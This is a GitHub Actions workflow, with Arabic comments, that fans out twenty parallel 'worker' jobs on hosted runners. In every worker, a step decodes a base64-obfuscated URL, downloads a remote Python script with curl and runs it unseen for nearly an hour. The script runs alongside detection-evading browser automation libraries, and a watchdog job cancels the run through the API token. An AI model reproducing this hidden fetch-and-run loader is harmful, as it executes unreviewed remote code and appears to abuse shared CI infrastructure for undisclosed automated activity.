name: Aether Grid Sentinel Core

on:
  workflow_dispatch:

concurrency:
  group: aether-sync-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: false

permissions:
  actions: write
  contents: read

jobs:
  # =================================================================
  # Watchdog: يراقب لمدة 59 دقيقة ثم يلغي تشغيل سير العمل بأكمله
  # =================================================================
  watchdog-timer:
    name: "System Watchdog"
    runs-on: ubuntu-latest
    timeout-minutes: 60
    env:
      MAX_WATCH_TIME: 3540
    steps:
      - name: Initialize Watchdog Monitor
        run: |
          echo "[WATCHDOG] Active for workflow run: ${{ github.run_id }}"
          echo "[WATCHDOG] Delaying execution for ${MAX_WATCH_TIME} seconds."

          sleep "${MAX_WATCH_TIME}"

          echo "[WATCHDOG] Limit reached. Initiating abort signal."

          curl -sS -X POST \
            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
            -H "Accept: application/vnd.github+json" \
            -H "X-GitHub-Api-Version: 2022-11-28" \
            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"

          echo "[WATCHDOG] Abort signal sent successfully."

  # =================================================================
  # Worker Mesh: تشغيل متوازي لعقد الشباك
  # =================================================================
  mesh-workers:
    name: "Worker-${{ matrix.node_code }}"
    runs-on: ubuntu-latest
    timeout-minutes: 59

    strategy:
      fail-fast: false
      matrix:
        node_code: [a101, b102, c103, d104, e105, f106, g107, h108, i109, j110, k111, l112, m113, n114, o115, p116, q117, r118, s119, t120]

    steps:
      # -----------------------------------------------------------------
      # Phase 1: إعداد وتحديث البيئة
      # -----------------------------------------------------------------
      - name: Setup Environment
        run: |
          echo "[SETUP] Preparing node environment for Worker-${{ matrix.node_code }}..."
          sudo apt-get update -qq
          sudo apt-get install -y curl python3-pip

      # -----------------------------------------------------------------
      # Phase 2: جلب ملف التشغيل
      # -----------------------------------------------------------------
      - name: Fetch Script Package
        run: |
          echo "[FETCH] Retrieving remote script..."
          TARGET_URL=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
          curl -sL "$TARGET_URL" -o worker_process.py
          echo "[FETCH] Script retrieval complete."

      # -----------------------------------------------------------------
      # Phase 3: تثبيت الاعتمادات المطلوبة
      # -----------------------------------------------------------------
      - name: Install Dependencies
        run: |
          echo "[DEPENDENCIES] Installing required libraries..."
          pip3 install -q undetected-chromedriver selenium requests psutil

      # -----------------------------------------------------------------
      # Phase 4: بدء العملية الرئيسية (حد أقصى 59 دقيقة)
      # -----------------------------------------------------------------
      - name: Execute Main Process
        run: |
          echo "[EXEC] Starting execution on Worker-${{ matrix.node_code }}..."

          python3 worker_process.py &
          TASK_PID=$!

          echo "[EXEC] Process running under PID: $TASK_PID. Timer set to 3540s."

          sleep 3540

          if kill -0 "$TASK_PID" 2>/dev/null; then
            echo "[EXEC] Execution timeout. Stopping process..."
            kill -9 "$TASK_PID"
            echo "[EXEC] Process killed."
          else
            echo "[EXEC] Task finished before timeout."
          fi
